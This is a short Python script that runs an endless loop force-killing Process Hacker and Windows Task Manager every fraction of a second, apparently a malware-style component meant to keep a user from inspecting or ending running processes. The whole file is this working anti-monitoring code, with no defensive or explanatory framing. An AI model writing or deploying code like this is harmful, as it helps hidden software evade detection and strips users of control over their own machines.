import time, os
while True:
    try:
        os.system('taskkill /f /im ProcessHacker.exe')
        os.system('taskkill /f /im Taskmgr.exe')
        time.sleep(0.2)
    except Exception as Er:
        time.sleep(0.1)
